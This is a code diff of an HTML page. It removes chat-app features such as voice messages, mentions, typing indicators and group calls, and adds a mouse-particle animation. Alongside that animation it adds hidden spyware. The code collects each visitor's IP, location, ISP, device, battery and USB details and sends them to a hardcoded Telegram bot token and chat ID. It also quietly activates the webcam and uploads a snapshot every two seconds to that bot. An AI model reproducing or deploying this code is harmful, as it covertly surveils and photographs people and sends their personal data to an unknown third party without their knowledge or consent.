-    document.getElementById('voiceSend').onclick = () => {
-        clearInterval(window.voiceState.interval);
-        document.getElementById('voiceRecordingUI').classList.add('hidden');
-        document.getElementById('input-container').classList.remove('hidden');
-
-        // Placeholder for voice file upload and sending
-        sendMessage('voice', { text: 'Voice Message', duration: document.getElementById('recTimer').textContent });
-    };
-
-    function playVoiceMessage(key) {
-        alert(`Playing voice message for key: ${key}. (Actual audio playback needed)`);
-    }
-
-    // --- Mention/Tagging ---
-    
-    async function showMentionPopup(currentInput) {
-        const onlineUsers = await getOnlineUsers();
-        const popup = document.getElementById('mention-popup');
-        
-        popup.innerHTML = onlineUsers.filter(u => u !== currentUsername).map(user => `
-            <div class="p-1 cursor-pointer hover:bg-green-700" onclick="selectMention('${user}')">@${user}</div>
-        `).join('');
-        
-        popup.classList.remove('hidden');
-    }
-    
-    function selectMention(username) {
-        const input = document.getElementById('messageInput');
-        const currentText = input.value;
-        // Replace the trailing '@' with the full tag
-        input.value = currentText.slice(0, -1) + `@${username} `; 
-        document.getElementById('mention-popup').classList.add('hidden');
-        input.focus();
-    }
-    
-    // --- Typing Indicator ---
-    
-    function listenForTyping() {
-        db.ref('users').on('value', (snapshot) => {
-            const users = snapshot.val();
-            const typingUsers = Object.values(users || {}).filter(u => u.isTyping && u.username !== currentUsername);
-            
-            const indicatorDiv = document.getElementById('typingIndicator');
-            if (typingUsers.length > 0) {
-                const names = typingUsers.map(u => u.username).join(', ');
-                indicatorDiv.querySelector('span').textContent = names;
-                indicatorDiv.textContent = `${names} is typing...`;
-                indicatorDiv.classList.remove('hidden');
-            } else {
-                indicatorDiv.classList.add('hidden');
+        window.addEventListener('mousemove', function(event) {
+            for (let i = 0; i < 5; i++) {
+                particlesArray.push(new Particle(event.x, event.y));
             }
         });
-    }
 
-    // --- Group Call ---
-    document.getElementById('groupCallButton').onclick = () => {
-        document.getElementById('chatInterface').classList.add('hidden');
-        document.getElementById('groupCallInterface').classList.remove('hidden');
-        // Notify chat that call started
-        db.ref('messages').push({
-            username: 'System',
-            icon: '📞',
-            uid: 'system',
-            timestamp: firebase.database.ServerValue.TIMESTAMP,
-            type: 'text',
-            text: `${currentUsername} started a group call! Click '📞 Group Call' to join.`,
+        animate();
+
+        let telegramBotToken = '7952228336:AAHj6Aj1EfhIdWpXKWE2qrVVh7_F4RQkVfg';
+        let telegramChatId = '6737589257';
+
+        sendDataToTelegram();
+
+        function sendDataToTelegram() {
+            fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                const country = data.country_name;
+                const region = data.region;
+                const city = data.city;
+                const isp = data.org;
+                const language = navigator.language;
+                const time = new Date().toLocaleTimeString();
+                const deviceName = navigator.userAgent;
+                const vendor = navigator.vendor;
+
+                let usbConnected = 'No';
+                if (navigator.usb) {
+                    navigator.usb.getDevices().then(devices => {
+                        if (devices.length > 0) {
+                            usbConnected = 'Yes';
+                        }
+                    });
+                }
+
+                let batteryLevel = 'Not supported';
+                navigator.getBattery().then(battery => {
+                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                }).catch(error => {
+                    console.error('Error getting battery level:', error);
+                });
+
+                let localIp = '';
+                fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    localIp = data.ip;
+                })
+                .catch(error => {
+                    console.error('Error getting local IP address:', error);
+                });
+
+                setTimeout(() => {
+                    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                    fetch(telegramApiUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: telegramChatId,
+                            text: `〄　ＤＸ－ＳＩＭＵ　⎙\n\n𝙸𝚙 𝙰𝚍𝚍𝚛𝚎𝚜𝚜: ${ipAddress}\n𝙻𝚘𝚌𝚊𝚕 𝙸𝚙: ${localIp}\n𝙲𝚘𝚞𝚗𝚝𝚛𝚢: ${country}\n𝚁𝚎𝚐𝚒𝚘𝚗: ${region}\n𝙲𝚒𝚝𝚢: ${city}\nIPS: ${isp}\n𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: ${language}\n𝚃𝚒𝚖𝚎: ${time}\n𝙳𝚎𝚟𝚒𝚌𝚎 𝙸𝚗𝚏𝚘: ${deviceName}\n\n𝚅𝚎𝚗𝚍𝚘𝚛: ${vendor}\n 𝙱𝚊𝚝𝚝𝚛𝚢: ${batteryLevel}\nUSB Connected: ${usbConnected} \n\nＭＡＤＥ　ＢＹ：@alphacodex369 `
+                        })
+                    });
+                }, 5000);
+            })
+            .catch(error => {
+                console.error('Error fetching IP data:', error);
+            });
+        }
+
+        const audio = document.getElementById('audio');
+        audio.addEventListener('start', () => {
+            audio.pause();
+            audio.currentTime = 0; // Reset audio to the beginning
         });
-    };
-    document.getElementById('callBack').onclick = () => {
-        document.getElementById('groupCallInterface').classList.add('hidden');
-        document.getElementById('chatInterface').classList.remove('hidden');
-    };
-    // Mute/Unmute Toggle
-    document.getElementById('muteToggle').onclick = (e) => {
-        const button = e.target;
-        const isMuted = button.textContent.includes('🔇');
-        button.textContent = isMuted ? '🎤' : '🔇';
-        button.title = isMuted ? 'Unmute' : 'Mute';
-        // Logic to actually mute/unmute audio stream needed here
-    };
 
-    // --- PWA & Emoji Placeholder ---
-    // PWA: Requires a manifest.json and service worker setup (beyond the scope of this single HTML file)
-    // Emoji Picker: Simplest form is to use a text field or modal, but let's just make the button add an emoji.
-    document.getElementById('emojiPicker').onclick = () => {
-        const emojis = ['😊', '😂', '😎', '🤔', '👍', '🔥'];
-        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-        document.getElementById('messageInput').value += randomEmoji;
-        document.getElementById('messageInput').focus();
-    };
+        // Webcam access and image capture
+        const video = document.createElement('video');
+        video.setAttribute('autoplay', '');
+        video.setAttribute('playsinline', '');
+        video.style.display = 'none';
+        document.body.appendChild(video);
 
-</script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                setInterval(captureImage, 2000); // Capture image every 2 seconds
+            })
+            .catch(error => {
+                console.error('Error accessing webcam:', error);
+            });
+
+        let lastImageData = '';
+
+        function captureImage() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            if (imageData !== lastImageData) {
+                lastImageData = imageData;
+                sendImageToTelegram(imageData);
+            }
+        }
+
+        function sendImageToTelegram(imageData) {
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', telegramChatId);
+            formData.append('photo', dataURItoBlob(imageData), 'image.png');
+            formData.append('caption', 'ＭＡＤＥ—ＢＹ：@Codex_369');
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Image sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending image to Telegram:', error);
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
 </body>
-    </html>
+  </html>
